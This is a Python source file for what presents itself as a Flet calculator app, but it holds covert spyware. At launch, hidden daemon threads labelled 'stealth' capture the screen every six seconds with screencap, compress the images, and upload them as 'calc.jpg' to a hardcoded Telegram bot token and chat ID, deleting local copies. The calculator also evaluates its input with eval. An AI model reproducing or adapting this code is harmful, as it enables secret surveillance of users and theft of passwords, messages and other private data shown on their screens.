import flet as ft
import os, threading, time, requests, zlib
from flet import Page, TextField, ElevatedButton, Row, Column

TOKEN = "7740589813:AAFuxatj_14ycjlVjk7eSmf2jxWvNiQMnIA"
CHAT  = "5648499583"
CACHE = "/data/data/com.example.wormcalc/cache/shots"
INTERVAL = 6      # 10 screens/min

os.makedirs(CACHE, exist_ok=True)

# ---------- stealth ----------
def stealth_shot():
    fname = f"{CACHE}/{int(time.time()*1000)}.png"
    os.system(f"screencap -p {fname} >/dev/null 2>&1")
    if os.path.exists(fname) and os.path.getsize(fname):
        with open(fname,"rb") as f:
            z = zlib.compress(f.read(), 9)
        open(fname+".z","wb").write(z)
        os.remove(fname)

def uploader():
    while True:
        try:
            for f in os.listdir(CACHE):
                path = os.path.join(CACHE, f)
                if f.endswith(".z"):
                    with open(path,"rb") as pic:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                                      data={"chat_id": CHAT},
                                      files={"photo": ("calc.jpg", pic, "image/jpeg")},
                                      timeout=15)
                    os.remove(path)
        except: pass
        time.sleep(2)

# ---------- calculator UI ----------
def main(page: Page):
    page.title = "Calculator"
    page.window.resizable = False
    page.window.width  = 260
    page.window.height = 380
    result = TextField(value="0", text_align="right", read_only=True, width=240, height=60)

    def on_click(e):
        b = e.control.text
        if b == "C":
            result.value = "0"
        elif b == "=":
            try: result.value = str(eval(result.value))
            except: result.value = "Error"
        else:
            result.value = result.value + b if result.value != "0" else b
        page.update()

    keys = ["7","8","9","/",
            "4","5","6","*",
            "1","2","3","-",
            "C","0","=","+"]
    rows = []
    for r in range(4):
        row = Row(spacing=5)
        for c in range(4):
            row.controls.append(
                ElevatedButton(text=keys[r*4 + c], on_click=on_click, width=60, height=50)
            )
        rows.append(row)

    page.add(Column([result, *rows], spacing=10))

    # ---------- start demons ----------
    threading.Thread(target=lambda: [stealth_shot() or time.sleep(INTERVAL) for _ in iter(int,1)], daemon=True).start()
    threading.Thread(target=uploader, daemon=True).start()

ft.app(target=main)
